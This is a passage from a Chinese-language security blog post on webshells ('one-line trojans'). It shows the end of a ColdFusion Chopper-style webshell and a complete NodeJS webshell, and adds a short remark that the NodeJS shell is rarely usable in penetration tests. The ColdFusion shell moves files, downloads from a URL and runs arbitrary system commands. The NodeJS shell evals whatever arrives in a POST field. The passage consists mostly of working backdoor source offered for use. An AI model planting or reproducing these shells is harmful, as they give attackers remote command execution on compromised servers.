VALUE=&quot;I&quot;&gt;&lt;CFFILE ACTION=&quot;MOVE&quot; SOURCE=&quot;#Form.z1#&quot; DESTINATION=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;J&quot;&gt;<br>&lt;CFDIRECTORY Directory=&quot;#Form.z1#&quot; Action=&quot;Create&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;K&quot;&gt;&lt;CFSCRIPT&gt;<br>FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;L&quot;&gt;&lt;CFSCRIPT&gt;Z=Form.z2;<br>For(i=Len(Z);i gt 0;i=i-1)&#123;if(Mid(Z,i,1) eq &quot;/&quot; Or Mid(Z,i,1) eq &quot;\&quot;)&#123;Break;&#125;&#125;P=Left(Z,i);F=Mid(Z,i+1,256);&lt;/CFSCRIPT&gt;<br>&lt;CFHTTP METHOD=&quot;Get&quot; URL=&quot;#Form.z1#&quot; PATH=&quot;#P#&quot; FILE=&quot;#F#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;M&quot;&gt;<br>&lt;CFEXECUTE Name=&quot;#Mid(Form.z1,3,Len(Form.z1)-2)#&quot; Arguments=&quot;#Mid(Form.z1,1,2)# #Form.z2#&quot; Variable=&quot;O&quot; TimeOut=&quot;60&quot; /&gt;<br>&lt;/CFCASE&gt;&lt;/CFSWITCH&gt;&lt;CFCATCH Type=&quot;Any&quot;&gt;&lt;CFSET O=&quot;ERROR:// &quot;&amp;CFCatch.Message /&gt;&lt;/CFCATCH&gt;<br>&lt;/CFTRY&gt;&lt;CFOUTPUT&gt;-&gt;#Chr(124)&amp;O&amp;Chr(124)#&lt;-&lt;/CFOUTPUT&gt;<br></code></pre></td></tr></table></figure>
<p>菜刀形，跟上面的JSP一樣。</p>
<h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var http = require(&#x27;http&#x27;),<br>	url = require(&#x27;url&#x27;),<br>    exec = require(&#x27;child_process&#x27;).exec;<br>var querystring = require(&#x27;querystring&#x27;);<br><br>var host = &quot;127.0.0.1&quot;,<br>    port = &quot;5555&quot;,<br>    thisServerUrl = &quot;http://&quot; + host + &quot;:&quot; + port;<br><br>http.createServer(function (req, res) &#123;<br>  req.addListener(&#x27;end&#x27;, function () &#123;<br><br>  &#125;);<br>  //var parsedUrl = url.parse(req.url, true);<br>  //var cmd = parsedUrl.query[&#x27;cmd&#x27;];<br>  var string = &#x27;&#x27;;<br>        req.addListener(&#x27;data&#x27;, function(chunk)&#123;<br>            string += chunk;<br>        &#125;);<br>	var cmd;<br>	req.addListener(&#x27;end&#x27;, function()&#123;<br>      var strObj = querystring.parse(string);<br>		  cmd = strObj.pass;<br>		  res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;);<br>      if (cmd) &#123;<br>        try &#123;eval(cmd);&#125; catch(e) &#123;console.log(&quot;ERROR://&quot; + e);res.end(&quot;ERROR://&quot;);&#125;<br>      &#125; else &#123;<br>		  res.end();<br>	  &#125;<br>  &#125;);<br>&#125;).listen(port, host);<br>console.log(&#x27;Server running at &#x27; + thisServerUrl );<br></code></pre></td></tr></table></figure>
<p>NodeJS的木馬在滲透測試中不見得能用上，<br>因為使用條件跟php, asp, aspx這些比較過於苛刻。</p>
<hr>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-start"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/06/%E3%80%90Tool%E3%80%91Alien/">← Next 【Tool】Alien</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしいの) music!</p><p style="text-align:center"><img class="music-anime" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div><button class="music-btn" id="music-toggle">▶ Play Music</button><span id="music-index" style="margin-left:10px"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
  var playlist = [
    "/mp3/music/music_1.mp3",
    "/mp3/music/sugar_story.mp3",
    "/mp3/music/story_music_box.mp3",
    "/mp3/music/musa.mp3",
    "/mp3/music/air.mp3",
    "/mp3/music/last_page.mp3",
  ];

  var current = 0;
  const audio = document.getElementById("bg-music");
  const btn = document.getElementById("music-toggle");
  const indexDisplay = document.getElementById("music-index");

  indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;

  btn.addEventListener("click", function () {
    if (audio.paused) {
      audio.src = playlist[current];
      audio.play();
      btn.innerText = "⏸ Pause Music";
    } else {
      audio.pause();
      btn.innerText = "▶ Play Music";
    }
  });

  audio.addEventListener("ended", function() {
    current = (current + 1) % playlist.length;
    audio.src = playlist[current];
    audio.play();
    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
  });
});</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%9A%E9%BA%BC%E6%98%AFWebShell"><span class="toc-number">1.</span> <span class="toc-text">甚麼是WebShell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC"><span class="toc-number">2.</span> <span class="toc-text">一句話木馬</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC%E5%AE%A2%E6%88%B6%E7%AB%AF"><span class="toc-number">3.</span> <span class="toc-text">一句話木馬客戶端</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC%E7%9A%84%E7%A8%8B%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">一句話木馬的程式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%9C%E6%96%BCASMX-ASHX-CFM-JSP-JSPX%E5%92%8CNodeJS%E6%9C%A8%E9%A6%AC"><span class="toc-number">4.1.</span> <span class="toc-text">關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ASMX"><span class="toc-number">4.1.1.</span> <span class="toc-text">ASMX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASHX"><span class="toc-number">4.1.2.</span> <span class="toc-text">ASHX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSP"><span class="toc-number">4.1.3.</span> <span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSPX"><span class="toc-number">4.1.4.</span> <span class="toc-text">JSPX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CFM"><span class="toc-number">4.1.5.</span> <span class="toc-text">CFM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS"><span class="toc-number">4.1.6.</span> <span class="toc-text">NodeJS</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>